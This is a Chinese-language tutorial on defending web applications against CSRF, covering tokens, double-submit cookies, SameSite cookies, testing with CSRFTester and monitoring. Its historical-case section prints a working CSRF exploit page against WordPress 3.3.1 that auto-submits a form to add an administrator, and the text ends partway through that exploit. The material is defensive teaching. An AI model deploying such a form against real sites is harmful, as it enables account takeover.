<p>而CSRF攻击之所以能够成功，是因为服务器误把攻击者发送的请求当成了用户自己的请求。那么我们可以要求所有的用户请求都携带一个CSRF攻击者无法获取到的Token。服务器通过校验请求是否携带正确的Token，来把正常的请求和攻击的请求区分开，也可以防范CSRF的攻击。</p> <p><strong>1. 将CSRF Token输出到页面中</strong></p> <p>首先，用户打开页面的时候，<font color="red" size="3">服务器需要给这个用户生成一个Token，该Token通过加密算法对数据进行加密，一般Token都包括随机字符串和时间戳的组合</font>，显然在提交时Token不能再放在Cookie中了，否则又会被攻击者冒用。因此，<font color="red" size="3">为了安全起见Token最好还是存在服务器的Session中</font>，之后在每次页面加载时，<font color="red" size="3">使用JS遍历整个DOM树，对于DOM中所有的a和form标签后加入Token</font>。这样可以解决大部分的请求，但是对于在页面加载之后动态生成的HTML代码，这种方法就没有作用，还需要程序员在编码时手动添加Token。</p> <p><strong>2. 页面提交的请求携带这个Token</strong></p> <p>对于GET请求，Token将附在请求地址之后，这样URL 就变成 http://url?csrftoken=tokenvalue。 而对于 POST 请求来说，要在 form 的最后加上：</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>”hidden”</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>”csrftoken”</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>”tokenvalue”/</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>这样，就把Token以参数的形式加入请求了。</p> <p><strong>3. 服务器验证Token是否正确</strong></p> <p>当用户从客户端得到了Token，再次提交给服务器的时候，服务器需要判断Token的有效性，验证过程是先解密Token，对比加密字符串以及时间戳，如果加密字符串一致且时间未过期，那么这个Token就是有效的。</p> <p>这种方法要比之前检查Referer或者Origin要安全一些，Token可以在产生并放于Session之中，然后在每次请求时把Token从Session中拿出，与请求中的Token进行比对，但这种方法的比较麻烦的在于如何把Token以参数的形式加入请求。</p> <p>下面将以Java为例，介绍一些CSRF Token的服务端校验逻辑，代码如下：</p> <div class="language-java line-numbers-mode"><pre class="language-java"><code><span class="token class-name">HttpServletRequest</span> req <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">)</span>request<span class="token punctuation">;</span> 
<span class="token class-name">HttpSession</span> s <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
 
<span class="token comment">// 从 session 中得到 csrftoken 属性</span>
<span class="token class-name">String</span> sToken <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span>“csrftoken”<span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token keyword">if</span><span class="token punctuation">(</span>sToken <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span> 
   <span class="token comment">// 产生新的 token 放入 session 中</span>
   sToken <span class="token operator">=</span> <span class="token function">generateToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
   s<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span>“csrftoken”<span class="token punctuation">,</span>sToken<span class="token punctuation">)</span><span class="token punctuation">;</span> 
   chain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span> <span class="token keyword">else</span><span class="token punctuation">{</span> 
   <span class="token comment">// 从 HTTP 头中取得 csrftoken </span>
   <span class="token class-name">String</span> xhrToken <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getHeader</span><span class="token punctuation">(</span>“csrftoken”<span class="token punctuation">)</span><span class="token punctuation">;</span> 
   <span class="token comment">// 从请求参数中取得 csrftoken </span>
   <span class="token class-name">String</span> pToken <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span>“csrftoken”<span class="token punctuation">)</span><span class="token punctuation">;</span> 
   <span class="token keyword">if</span><span class="token punctuation">(</span>sToken <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> xhrToken <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> sToken<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>xhrToken<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> 
       chain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span> 
   <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>sToken <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> pToken <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> sToken<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>pToken<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> 
       chain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span> 
   <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span> 
       request<span class="token punctuation">.</span><span class="token function">getRequestDispatcher</span><span class="token punctuation">(</span>“error<span class="token punctuation">.</span>jsp”<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forward</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span>response<span class="token punctuation">)</span><span class="token punctuation">;</span> 
   <span class="token punctuation">}</span> 
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br></div></div><p>代码源自<a href="https://www.ibm.com/developerworks/cn/web/1102_niugang_csrf/" target="_blank" rel="noopener noreferrer">IBM developerworks CSRF<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <h3 id="分布式校验"><a href="#分布式校验" class="header-anchor">#</a> 分布式校验</h3> <p>在大型网站中，使用Session存储CSRF  Token会带来很大的压力。访问单台服务器session是同一个。但是现在的大型网站中，我们的服务器通常不止一台，可能是几十台甚至几百台之多，甚至多个机房都可能在不同的省份，用户发起的HTTP请求通常要经过<font color="red" size="3">像Ngnix之类的负载均衡器</font>之后，再路由到具体的服务器上，由于Session默认存储在单机服务器内存中，因此在<font color="red" size="3">分布式环境下同一个用户发送的多次HTTP请求可能会先后落到不同的服务器上，导致后面发起的HTTP请求无法拿到之前的HTTP请求存储在服务器中的Session数据</font>，从而使得Session机制在分布式环境下失效，<font color="red" size="3">因此在分布式集群中CSRF Token需要存储在Redis之类的公共存储空间。</font></p> <h3 id="encrypted-token-pattern"><a href="#encrypted-token-pattern" class="header-anchor">#</a> Encrypted Token Pattern</h3> <p>由于使用Session存储，读取和验证CSRF Token会引起比较大的复杂度和性能问题，目前很多网站采用Encrypted Token  Pattern方式。这种方法的Token是一个计算出来的结果，而非随机生成的字符串。这样在校验时无需再去读取存储的Token，只用再次计算一次即可。</p> <p>这种Token的值通常是使用UserID、时间戳和随机数，通过加密的方法生成。这样既可以保证分布式服务的Token一致，又能保证Token不容易被破解。</p> <p>在token解密成功之后，服务器可以访问解析值，Token中包含的UserID和时间戳将会被拿来被验证有效性，将UserID与当前登录的UserID进行比较，并将时间戳与当前时间进行比较。</p> <h4 id="总结"><a href="#总结" class="header-anchor">#</a> 总结</h4> <p>Token是一个比较有效的CSRF防护方法，只要页面没有XSS漏洞泄露Token，那么接口的CSRF攻击就无法成功。</p> <p>但是此方法的实现比较复杂，需要给每一个页面都写入Token（前端无法使用纯静态页面），每一个Form及Ajax请求都携带这个Token，后端对每一个接口都进行校验，并保证页面Token及请求Token一致。这就使得这个防护策略不能在通用的拦截上统一拦截处理，而需要每一个页面和接口都添加对应的输出和校验。这种方法工作量巨大，且有可能遗漏。</p> <blockquote><p>验证码和密码其实也可以起到CSRF Token的作用哦，而且更安全。</p> <p>为什么很多银行等网站会要求已经登录的用户在转账时再次输入密码，现在是不是有一定道理了？</p></blockquote> <h3 id="双重cookie验证"><a href="#双重cookie验证" class="header-anchor">#</a> 双重Cookie验证</h3> <p><font color="red" size="3">在会话中存储CSRF Token比较繁琐，而且不能在通用的拦截上统一处理所有的接口。</font></p> <p>那么另一种防御措施是使用双重提交Cookie。利用CSRF攻击不能获取到用户Cookie的特点，我们可以要求Ajax和表单请求携带一个Cookie中的值。</p> <p>双重Cookie采用以下流程：</p> <ul><li>在用户访问网站页面时，向请求域名注入一个Cookie，内容为随机字符串（例如<code>csrfcookie=v8g9e4ksfhw</code>）。</li> <li>在前端向后端发起请求时，取出Cookie，并添加到URL的参数中（接上例<code>POST https://www.a.com/comment?csrfcookie=v8g9e4ksfhw</code>）。</li> <li>后端接口验证Cookie中的字段与URL参数中的字段是否一致，不一致则拒绝。</li></ul> <p>此方法相对于CSRF Token就简单了许多。可以直接通过前后端拦截的的方法自动化实现。后端校验也更加方便，只需进行请求中字段的对比，而不需要再进行查询和存储Token。</p> <p>当然，此方法并没有大规模应用，其在大型网站上的安全性还是没有CSRF Token高，原因我们举例进行说明。</p> <p>由于任何跨域都会导致前端无法获取Cookie中的字段（包括子域名之间），于是发生了如下情况：</p> <ul><li>如果用户访问的网站为<code>www.a.com</code>，而后端的api域名为<code>api.a.com</code>。那么在<code>www.a.com</code>下，前端拿不到<code>api.a.com</code>的Cookie，也就无法完成双重Cookie认证。</li> <li>于是这个认证Cookie必须被种在<code>a.com</code>下，这样每个子域都可以访问。</li> <li>任何一个子域都可以修改<code>a.com</code>下的Cookie。</li> <li>某个子域名存在漏洞被XSS攻击（例如<code>upload.a.com</code>）。虽然这个子域下并没有什么值得窃取的信息。但攻击者修改了<code>a.com</code>下的Cookie。</li> <li>攻击者可以直接使用自己配置的Cookie，对XSS中招的用户再向<code>www.a.com</code>下，发起CSRF攻击。</li></ul> <h4 id="总结-2"><a href="#总结-2" class="header-anchor">#</a> 总结：</h4> <p><strong>用双重Cookie防御CSRF的优点：</strong></p> <ul><li>无需使用Session，适用面更广，易于实施。</li> <li>Token储存于客户端中，不会给服务器带来压力。</li> <li>相对于Token，实施成本更低，可以在前后端统一拦截校验，而不需要一个个接口和页面添加。</li></ul> <p><strong>缺点：</strong></p> <ul><li>Cookie中增加了额外的字段。</li> <li>如果有其他漏洞（例如XSS），攻击者可以注入Cookie，那么该防御方式失效。</li> <li>难以做到子域名的隔离。</li> <li>为了确保Cookie传输安全，采用这种防御方式的最好确保用整站HTTPS的方式，如果还没切HTTPS的使用这种方式也会有风险。</li></ul> <h3 id="samesitecookie属性"><a href="#samesitecookie属性" class="header-anchor">#</a> <font color="red" size="5">SamesiteCookie属性</font></h3> <p>防止CSRF攻击的办法已经有上面的预防措施。为了从源头上解决这个问题，Google起草了一份草案来改进HTTP协议，<strong><font color="red" size="3">那就是为Set-Cookie响应头新增Samesite属性，它用来标明这个 Cookie是个“同站 Cookie”，同站Cookie只能作为第一方Cookie，不能作为第三方Cookie，Samesite  有两个属性值，分别是 Strict 和 Lax</font></strong>，下面分别讲解：</p> <ul><li>None: 任何情况下都会向第三方网站请求发送 Cookie</li> <li>Lax: 只有导航到第三方网站的 Get 链接会发送 Cookie，跨域的图片、iframe、form 表单都不会发送 Cookie</li> <li>Strict: 任何情况下都不会向第三方网站请求发送 Cookie</li></ul> <h4 id="samesite-strict"><a href="#samesite-strict" class="header-anchor">#</a> Samesite=Strict</h4> <p>这种称为严格模式，表明这个 Cookie 在任何情况下都不可能作为第三方 Cookie，绝无例外。比如说 b.com 设置了如下 Cookie：</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code>Set-Cookie: foo=1; Samesite=Strict
Set-Cookie: bar=2; Samesite=Lax
Set-Cookie: baz=3
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>我们在 a.com 下发起对 b.com 的任意请求，foo 这个 Cookie 都不会被包含在 Cookie  请求头中，但 bar 会。举个实际的例子就是，假如淘宝网站用来识别用户登录与否的 Cookie 被设置成了  Samesite=Strict，那么用户从百度搜索页面甚至天猫页面的链接点击进入淘宝后，淘宝都不会是登录状态，因为淘宝的服务器不会接受到那个  Cookie，其它网站发起的对淘宝的任意请求都不会带上那个 Cookie。</p> <h4 id="samesite-lax"><a href="#samesite-lax" class="header-anchor">#</a> Samesite=Lax</h4> <p>这种称为宽松模式，比 Strict 放宽了点限制：假如这个请求是这种请求（改变了当前页面或者打开了新页面）且同时是个GET请求，则这个Cookie可以作为第三方Cookie。比如说 b.com设置了如下Cookie：</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code>Set-Cookie: foo=1; Samesite=Strict
Set-Cookie: bar=2; Samesite=Lax
Set-Cookie: baz=3
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>当用户从 a.com 点击链接进入 b.com 时，foo 这个 Cookie 不会被包含在 Cookie  请求头中，但 bar 和 baz 会，也就是说用户在不同网站之间通过链接跳转是不受影响了。但假如这个请求是从 a.com 发起的对 b.com  的异步请求，或者页面跳转是通过表单的 post 提交触发的，则bar也不会发送。</p> <p>生成Token放到Cookie中并且设置Cookie的Samesite，Java代码如下：</p> <div class="language-java line-numbers-mode"><pre class="language-java"><code> <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">addTokenCookieAndHeader</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> httpRequest<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> httpResponse<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">//生成token</span>
        <span class="token class-name">String</span> sToken <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">generateToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//手动添加Cookie实现支持“Samesite=strict”</span>
        <span class="token comment">//Cookie添加双重验证</span>
        <span class="token class-name">String</span> <span class="token class-name">CookieSpec</span> <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">&quot;%s=%s; Path=%s; HttpOnly; Samesite=Strict&quot;</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">determineCookieName</span><span class="token punctuation">(</span>httpRequest<span class="token punctuation">)</span><span class="token punctuation">,</span> sToken<span class="token punctuation">,</span> httpRequest<span class="token punctuation">.</span><span class="token function">getRequestURI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        httpResponse<span class="token punctuation">.</span><span class="token function">addHeader</span><span class="token punctuation">(</span><span class="token string">&quot;Set-Cookie&quot;</span><span class="token punctuation">,</span> <span class="token class-name">CookieSpec</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        httpResponse<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span>CSRF_TOKEN_NAME<span class="token punctuation">,</span> token<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>代码源自<a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet#Implementation_example" target="_blank" rel="noopener noreferrer">OWASP Cross-Site_Request_Forgery #Implementation example<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <h4 id="我们应该如何使用samesitecookie"><a href="#我们应该如何使用samesitecookie" class="header-anchor">#</a> 我们应该如何使用SamesiteCookie</h4> <p>如果SamesiteCookie被设置为Strict，浏览器在任何跨域请求中都不会携带Cookie，新标签重新打开也不携带，所以说CSRF攻击基本没有机会。</p> <p>但是跳转子域名或者是新标签重新打开刚登陆的网站，之前的Cookie都不会存在。尤其是有登录的网站，那么我们新打开一个标签进入，或者跳转到子域名的网站，都需要重新登录。对于用户来讲，可能体验不会很好。</p> <p>如果SamesiteCookie被设置为Lax，那么其他网站通过页面跳转过来的时候可以使用Cookie，可以保障外域连接打开页面时用户的登录状态。但相应的，其安全性也比较低。</p> <p>另外一个问题是Samesite的兼容性不是很好，现阶段除了从新版Chrome和Firefox支持以外，Safari以及iOS Safari都还不支持，现阶段看来暂时还不能普及。</p> <p>而且，SamesiteCookie目前有一个致命的缺陷：不支持子域。例如，种在topic.a.com下的Cookie，并不能使用a.com下种植的SamesiteCookie。这就导致了当我们网站有多个子域名时，不能使用SamesiteCookie在主域名存储用户登录信息。每个子域名都需要用户重新登录一次。</p> <p>总之，SamesiteCookie是一个可能替代同源验证的方案，但目前还并不成熟，其应用场景有待观望。</p> <h3 id="防止网站被利用"><a href="#防止网站被利用" class="header-anchor">#</a> 防止网站被利用</h3> <p>前面所说的，都是被攻击的网站如何做好防护。而非防止攻击的发生，CSRF的攻击可以来自：</p> <ul><li>攻击者自己的网站。</li> <li>有文件上传漏洞的网站。</li> <li>第三方论坛等用户内容。</li> <li>被攻击网站自己的评论功能等。</li></ul> <p>对于来自黑客自己的网站，我们无法防护。但对其他情况，那么如何防止自己的网站被利用成为攻击的源头呢？</p> <ul><li>严格管理所有的上传接口，防止任何预期之外的上传内容（例如HTML）。</li> <li>添加Header <code>X-Content-Type-Options: nosniff</code> 防止黑客上传HTML内容的资源（例如图片）被解析为网页。</li> <li>对于用户上传的图片，进行转存或者校验。不要直接使用用户填写的图片链接。</li> <li>当前用户打开其他用户填写的链接时，需告知风险（这也是很多论坛不允许直接在内容中发布外域链接的原因之一，不仅仅是为了用户留存，也有安全考虑）。</li></ul> <h3 id="csrf其他防范措施"><a href="#csrf其他防范措施" class="header-anchor">#</a> CSRF其他防范措施</h3> <p>对于一线的程序员同学，我们可以通过各种防护策略来防御CSRF，对于QA、SRE、安全负责人等同学，我们可以做哪些事情来提升安全性呢？</p> <h3 id="csrf测试"><a href="#csrf测试" class="header-anchor">#</a> CSRF测试</h3> <p>CSRFTester是一款CSRF漏洞的测试工具，CSRFTester工具的测试原理大概是这样的，使用代理抓取我们在浏览器中访问过的所有的连接以及所有的表单等信息，通过在CSRFTester中修改相应的表单等信息，重新提交，相当于一次伪造客户端请求，如果修改后的测试请求成功被网站服务器接受，则说明存在CSRF漏洞，当然此款工具也可以被用来进行CSRF攻击。 CSRFTester使用方法大致分下面几个步骤：</p> <p><strong>步骤1：设置浏览器代理</strong></p> <p>CSRFTester默认使用Localhost上的端口8008作为其代理，如果代理配置成功，CSRFTester将为您的浏览器生成的所有后续HTTP请求生成调试消息。</p> <p><strong>步骤2：使用合法账户访问网站开始测试</strong></p> <p>我们需要找到一个我们想要为CSRF测试的特定业务Web页面。找到此页面后，选择CSRFTester中的“开始录制”按钮并执行业务功能；完成后，点击CSRFTester中的“停止录制”按钮；正常情况下，该软件会全部遍历一遍当前页面的所有请求。</p> <p><strong>步骤3：通过CSRF修改并伪造请求</strong></p> <p>之后，我们会发现软件上有一系列跑出来的记录请求，这些都是我们的浏览器在执行业务功能时生成的所有GET或者POST请求。通过选择列表中的某一行，我们现在可以修改用于执行业务功能的参数，可以通过点击对应的请求修改query和form的参数。当修改完所有我们希望诱导用户form最终的提交值，可以选择开始生成HTML报告。</p> <p><strong>步骤4：拿到结果如有漏洞进行修复</strong></p> <p>首先必须选择“报告类型”。报告类型决定了我们希望受害者浏览器如何提交先前记录的请求。目前有5种可能的报告：表单、iFrame、IMG、XHR和链接。一旦选择了报告类型，我们可以选择在浏览器中启动新生成的报告，最后根据报告的情况进行对应的排查和修复。</p> <h3 id="csrf监控"><a href="#csrf监控" class="header-anchor">#</a> CSRF监控</h3> <p>对于一个比较复杂的网站系统，某些项目、页面、接口漏掉了CSRF防护措施是很可能的。</p> <p>一旦发生了CSRF攻击，我们如何及时的发现这些攻击呢？</p> <p>CSRF攻击有着比较明显的特征：</p> <ul><li>跨域请求。</li> <li>GET类型请求Header的MIME类型大概率为图片，而实际返回Header的MIME类型为Text、JSON、HTML。</li></ul> <p>我们可以在网站的代理层监控所有的接口请求，如果请求符合上面的特征，就可以认为请求有CSRF攻击嫌疑。我们可以提醒对应的页面和项目负责人，检查或者 Review其CSRF防护策略。</p> <h3 id="个人用户csrf安全的建议"><a href="#个人用户csrf安全的建议" class="header-anchor">#</a> 个人用户CSRF安全的建议</h3> <p>经常上网的个人用户，可以采用以下方法来保护自己：</p> <ul><li>使用网页版邮件的浏览邮件或者新闻也会带来额外的风险，因为查看邮件或者新闻消息有可能导致恶意代码的攻击。</li> <li>尽量不要打开可疑的链接，一定要打开时，使用不常用的浏览器。</li></ul> <h3 id="总结-3"><a href="#总结-3" class="header-anchor">#</a> 总结</h3> <p>简单总结一下上文的防护策略：</p> <ul><li>CSRF自动防御策略：同源检测（Origin 和 Referer 验证）。</li> <li>CSRF主动防御措施：Token验证 或者 双重Cookie验证 以及配合Samesite Cookie。</li> <li>保证页面的幂等性，后端接口不要在GET页面中做用户操作。</li></ul> <p>为了更好的防御CSRF，最佳实践应该是结合上面总结的防御措施方式中的优缺点来综合考虑，结合当前Web应用程序自身的情况做合适的选择，才能更好的预防CSRF的发生。</p> <h3 id="历史案例"><a href="#历史案例" class="header-anchor">#</a> 历史案例</h3> <h3 id="wordpress的csrf漏洞"><a href="#wordpress的csrf漏洞" class="header-anchor">#</a> WordPress的CSRF漏洞</h3> <p>2012年3月份，WordPress发现了一个CSRF漏洞，影响了WordPress  3.3.1版本，WordPress是众所周知的博客平台，该漏洞可以允许攻击者修改某个Post的标题，添加管理权限用户以及操作用户账户，包括但不限于删除评论、修改头像等等。具体的列表如下:</p> <ul><li>Add Admin/User</li> <li>Delete Admin/User</li> <li>Approve comment</li> <li>Unapprove comment</li> <li>Delete comment</li> <li>Change background image</li> <li>Insert custom header image</li> <li>Change site title</li> <li>Change administrator’s email</li> <li>Change Wordpress Address</li> <li>Change Site Address</li></ul> <p>那么这个漏洞实际上就是攻击者引导用户先进入目标的WordPress，然后点击其钓鱼站点上的某个按钮，该按钮实际上是表单提交按钮，其会触发表单的提交工作，添加某个具有管理员权限的用户，实现的码如下：</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token special-attr"><span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span><span class="token value javascript language-javascript"><span class="token literal-property property">javascript</span><span class="token operator">:</span>document<span class="token punctuation">.</span>forms<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">&quot;</span></span></span><span class="token punctuation">&gt;</span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>H2</span><span class="token punctuation">&gt;</span></span>CSRF Exploit to add Administrator<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>H2</span><span class="token punctuation">&gt;</span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>POST<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>form0<span class="token punctuation">&quot;</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>http://&lt;wordpress_ip&gt;:80/wp-admin/user-new.php<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>hidden<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>action<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>createuser<span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>hidden<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>_wpnonce_create-user<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>&lt;sniffed_value&gt;<span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>hidden<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>_wp_http_referer<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>%2Fwordpress%2Fwp-admin%2Fuser-new.php<span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>hidden<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>user_login<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>admin2<span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>hidden<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>email<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>admin2@admin.com<span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span> 
